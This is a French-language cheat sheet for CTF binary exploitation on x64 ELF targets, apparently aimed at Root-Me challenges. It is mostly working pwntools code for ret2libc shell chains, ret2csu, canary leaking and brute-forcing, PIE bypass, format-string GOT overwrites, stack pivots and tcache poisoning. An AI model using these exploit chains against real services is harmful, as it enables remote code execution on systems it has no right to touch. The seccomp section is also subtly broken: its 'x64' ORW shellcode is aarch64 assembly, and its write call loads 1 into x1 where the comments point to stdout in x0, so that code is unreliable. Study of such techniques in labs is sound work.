# CTF App-System — ELF x64 (64-bit)

## Convention d'appel System V AMD64

```
Registres pour les arguments :
  rdi → arg1
  rsi → arg2
  rdx → arg3
  rcx → arg4
  r8  → arg5
  r9  → arg6
  Reste → sur la pile

Valeur de retour : rax
Registres sauvegardés par l'appelé : rbx, rbp, r12-r15
```

**Implication ROP** : pour appeler `system("/bin/sh")`, besoin de `pop rdi; ret` pour mettre `/bin/sh` dans rdi.

## Stack layout 64-bit

```
[ arg7+... ]  ← si plus de 6 args
[ ret addr ]  ← rsp+0  (← RIP overwrite)
[ saved rbp]  ← rbp
[ local vars]
[ buffer   ]  ← rbp-N
```

**Offset** = N + 8 (saved RBP) → overwrite return address.

## Stack alignment critique (SIGSEGV dans movaps)

```python
# PROBLÈME : glibc utilise SSE (movaps) qui requiert alignement 16 bytes
# SYMPTÔME : crash dans system() ou printf() mais pas dans overflow
# SOLUTION : ajouter un gadget `ret` avant l'appel

ret_gadget = elf.address + 0x...  # ROPgadget --binary ./ch | grep ": ret$"
payload = b'A' * offset + p64(ret_gadget) + p64(pop_rdi) + p64(binsh) + p64(system)
#                         ↑ alignment fix
```

## ret2libc 64-bit complet

```python
from pwn import *

elf  = ELF('./challenge')
libc = ELF('./libc.so.6')
rop  = ROP(elf)
context.arch = 'amd64'

# Gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]

offset = 72  # cyclic_find(crash_val)

# === Stage 1 : Leak puts@GOT ===
payload  = b'A' * offset
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])  # retour pour stage 2

io.sendlineafter(b'> ', payload)
puts_leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc_base = puts_leak - libc.symbols['puts']
system    = libc_base + libc.symbols['system']
binsh     = libc_base + next(libc.search(b'/bin/sh'))

# === Stage 2 : system("/bin/sh") ===
payload2  = b'A' * offset
payload2 += p64(ret)           # alignment
payload2 += p64(pop_rdi)
payload2 += p64(binsh)
payload2 += p64(system)

io.sendlineafter(b'> ', payload2)
io.interactive()
```

## Contrôler rsi et rdx (3 arguments)

```python
# ROPgadget pour contrôler rsi, rdx
# pop rsi; pop r15; ret  (classique dans __libc_csu_init)
# pop rdx; pop rbx; ret  (souvent dans libc)

pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
pop_rdx_rbx = libc_base + 0x...  # depuis libc

# 3-arg call : open(filename, flags, mode)
payload += p64(pop_rdi) + p64(filename_addr)
payload += p64(pop_rsi_r15) + p64(O_RDONLY) + p64(0)  # r15 = junk
payload += p64(pop_rdx_rbx) + p64(0) + p64(0)         # mode + junk
payload += p64(open_addr)
```

## ret2csu (quand gadgets manquent)

```python
# __libc_csu_init contient deux blocs de gadgets universels :
# Gadget A (fin de boucle) :
#   pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
# Gadget B (dans la boucle) :
#   mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12 + rbx*8]

# Trouver les offsets
elf.symbols['__libc_csu_init']
# Gadget A = csu + 0x5a (souvent), Gadget B = csu + 0x40

def ret2csu(func_got_ptr, arg1=0, arg2=0, arg3=0, ret_addr=None):
    """Appel une fonction avec 3 arguments via __libc_csu_init"""
    csu_end   = elf.symbols['__libc_csu_init'] + 0x5a  # pop rbx...
    csu_mid   = elf.symbols['__libc_csu_init'] + 0x40  # mov rdx,r15...
    
    chain  = p64(csu_end)
    chain += p64(0)               # rbx = 0 (pour call [r12+0])
    chain += p64(1)               # rbp = 1 (condition boucle)
    chain += p64(func_got_ptr)    # r12 → fonction à appeler
    chain += p64(arg1)            # r13 → edi (arg1, 32-bit!)
    chain += p64(arg2)            # r14 → rsi (arg2)
    chain += p64(arg3)            # r15 → rdx (arg3)
    chain += p64(csu_mid)         # retour vers le milieu de csu
    # 7 * p64(0) pour les registres pop après la boucle
    chain += p64(0) * 7
    if ret_addr:
        chain += p64(ret_addr)
    return chain
```

## PIE bypass

```python
# PIE = Position Independent Executable : toutes les adresses randomisées

# Méthode 1 : leak via format string
payload = b'%p.' * 30  # Trouver une adresse du binaire sur la pile
# Identifier l'adresse (se termine généralement en adresse connue)
# Soustrait l'offset pour trouver la base PIE

# Méthode 2 : partial overwrite (quand canary absent)
# Seuls les 12 bits de poids faible sont fixes (alignement page)
# Overwrite seulement les 2 derniers octets du RIP
payload = b'A' * offset + p16(0x1234)  # 50% chance avec 1 nibble aléatoire

# Méthode 3 : information disclosure via format string
# leak PIE base : adresse retour dans main visible sur la pile
# Souvent : stack[offset] - (main+N) = PIE_base
```

## Canary leak et bypass

```python
# Méthode 1 : format string leak
# Canary est sur la pile, trouve son offset avec %N$p
# Généralement finit par \x00 (null byte)
for i in range(1, 50):
    io.sendline(f'%{i}$016lx'.encode())
    val = int(io.recvline().strip(), 16)
    if val & 0xff == 0:  # Canary commence par \x00
        print(f"Canary à la position {i}: {hex(val)}")

# Méthode 2 : brute-force byte par byte (serveur forking)
canary = b'\x00'  # 1er byte toujours nul
for idx in range(1, 8):  # 7 bytes restants
    for byte in range(256):
        # Envoyer : buffer_size + bytes_du_canary + byte_test
        payload = b'A' * offset + canary + bytes([byte])
        # Si pas de "stack smashing detected" → byte correct
        ...
    canary += bytes([found_byte])

# Utilisation du canary leaké dans le payload
payload = b'A' * canary_offset + canary + p64(0)  # saved rbp
payload += p64(pop_rdi) + p64(binsh) + p64(system)
```

## GOT overwrite (Partial RELRO)

```python
# Overwrite une entrée GOT pour rediriger un appel de fonction
# Nécessite : Partial RELRO (GOT writable) + pas de PIE ou PIE leaké

target_got = elf.got['exit']    # ou 'puts', 'printf', etc.
win_func   = elf.symbols['win'] # ou system

# Via format string (méthode principale)
from pwn import fmtstr_payload
payload = fmtstr_payload(fmt_offset, {target_got: win_func}, write_size='short')

# Via overflow direct (si adresse fixe)
# Écrire win_func à l'adresse target_got
```

## one_gadget (shell direct sans args)

```python
from pwn import *
import subprocess

# Trouver les gadgets
result = subprocess.check_output(['one_gadget', 'libc.so.6']).decode()
# → 0x4f2a5 execve("/bin/sh", rsp+0x40, environ) constraints: [rsp+0x40] == NULL
# → 0x4f302 execve("/bin/sh", rsp+0x40, environ) constraints: [rsp+0x40] == NULL

# Tester chaque gadget
for offset in [0x4f2a5, 0x4f302, 0xe6c7e]:
    one_gadget = libc_base + offset
    payload = b'A' * padding + p64(one_gadget)
    # Si les contraintes sont satisfaites → shell direct
```

## Techniques avancées x64

### Stack pivot (overflow limité)

```python
# Quand overflow < 16 bytes (seulement RBP + RIP)
# Pattern : overwrite RBP → zone contrôlée, RIP → leave;ret

leave_ret = rop.find_gadget(['leave', 'ret'])[0]
fake_stack = elf.bss() + 0x100  # Zone BSS contrôlable

# Stage 1 : pivot vers BSS
payload = b'A' * (offset - 8) + p64(fake_stack) + p64(leave_ret)
# Stage 2 : ROP chain en BSS (lire via read() par ex)
```

### Format string → leak multiple (PIE + canary + libc)

```python
# Un seul format string pour leaker tout
# Chercher sur la pile : adresse libc, adresse binaire, canary
payload = b'%p.' * 50
io.sendline(payload)
leaks = io.recvline().decode().split('.')
# Analyser chaque valeur :
# - libc : commence par 0x7f
# - canary : termine par \x00 (visible comme 0x...XX00)
# - PIE : offset connu par rapport à sections

for i, leak in enumerate(leaks):
    val = int(leak, 16) if leak.startswith('0x') else 0
    if val > 0x7f0000000000: print(f"[{i}] Possible libc: {hex(val)}")
    if val & 0xff == 0:       print(f"[{i}] Possible canary: {hex(val)}")
```

### Heap leak pour tcache poison

```python
# tcache poisoning (glibc 2.26-2.31)
# safe-linking (glibc 2.32+) : fd = ptr ^ (chunk_addr >> 12)

# Leak heap address via UAF
io.sendline(b'1')  # alloc
io.sendline(b'3')  # free (sans null)
io.sendline(b'2')  # view → affiche fd du chunk free = heap addr

heap_addr = u64(io.recvn(8))
# glibc 2.32+ : fd = ptr ^ (addr >> 12)
# Pour décoder : heap_key = heap_addr >> 12
# fd_mangled = target_addr ^ heap_key

# tcache poison : allouer 2 chunks, free les 2, overwrite fd du 2ème
```

## BROP (Blind ROP) — serveur SSH sans binaire

```python
# Si le binaire n'est PAS disponible en téléchargement mais accessible via SSH
# Utiliser BROP pour construire l'exploit depuis zéro

# Étape 1 : canary leak byte par byte (serveur forking)
# Étape 2 : stop gadget (adresse qui ne crashe pas)
# Étape 3 : BROP gadget (pop 6 registres) → pop_rdi = brop + 9
# Étape 4 : PLT scanner → trouver puts()
# Étape 5 : puts(pie_base) → dump du binaire
# Étape 6 : Exploit classique sur le binaire dumpé

# Voir ctf-pwn/brop.md pour implémentation complète

# Pour Root-Me SSH : le binaire est souvent DISPONIBLE dans ~/
# → Télécharger via scp avant de tenter BROP
scp -P 2222 user@host:~/challenge ./
```

## Seccomp + ROP (glibc 2.38+)

```python
from pwn import *

# Vérifier les règles seccomp du challenge
# (après connexion SSH ou en local)
seccomp_dump = subprocess.check_output(['seccomp-tools', 'dump', './challenge'])
# Ou en live :
# seccomp-tools dump ./challenge

# Syscalls souvent bloqués : execve, execveat
# Syscalls souvent autorisés : open/openat, read, write, mmap

# Stratégie ORW (Open-Read-Write) quand execve bloqué
from pwn import *

# Shellcode ORW
ORW = asm(f'''
    /* openat(AT_FDCWD, "/challenge/.passwd", O_RDONLY) */
    mov x8, #56          /* __NR_openat */
    mov x0, #-100        /* AT_FDCWD */
    adr x1, flag_path
    mov x2, #0           /* O_RDONLY */
    mov x3, #0
    svc #0
    
    /* read(fd, buf, 0x100) */
    mov x1, x0           /* fd retourné */
    mov x8, #63          /* __NR_read */
    mov x0, x1
    mov x1, sp           /* buf = stack */
    mov x2, #0x100
    svc #0
    
    /* write(1, buf, bytes_read) */
    mov x8, #64          /* __NR_write */
    mov x1, #1
    /* x1 = stdout */
    svc #0
    
    flag_path: .ascii "/challenge/.passwd\\0"
''', arch='aarch64')
```

## Leakless x64 pour Root-Me

```python
# Quand ASLR + PIE + Full RELRO : besoin de leaks
# Mais si le binaire a une vulnérabilité heap ET glibc >= 2.32 :
# Utiliser les techniques leakless (voir ctf-pwn/heap-leakless.md)

# Sur Root-Me : la libc du serveur est souvent identifiable
# 1. Se connecter et noter la version
# 2. Télécharger la libc
# 3. Utiliser les techniques adaptées à cette version

# Workflow adaptatif selon glibc :
def choose_heap_technique(libc_version):
    if libc_version < (2, 26):
        return "fastbin_dup"          # Pas de tcache
    elif libc_version < (2, 32):
        return "tcache_poison"         # tcache sans safe-linking
    elif libc_version < (2, 34):
        return "tcache_safe_linking"   # Besoin du heap key
    elif libc_version < (2, 39):
        return "house_of_water"        # tcache_perthread_struct
    else:
        return "house_of_tangerine"    # malloc-only AAW
```

## Commandes de recon x64

```bash
# Trouver l'offset de puts dans libc (pour calculer libc_base)
readelf -s ./libc.so.6 | grep " puts"
# → 000000000007faa0 ... FUNC GLOBAL DEFAULT   15 puts@@GLIBC_2.2.5

# Trouver /bin/sh dans libc
strings -a -t x ./libc.so.6 | grep "/bin/sh"
# → 1b45bd /bin/sh

# ROPgadget
ROPgadget --binary ./challenge --rop | grep "pop rdi"
ROPgadget --binary ./libc.so.6 --rop | grep "pop rdx"

# pwntools rop
python3 -c "
from pwn import *
elf = ELF('./challenge')
rop = ROP(elf)
print(rop.dump())
"
```
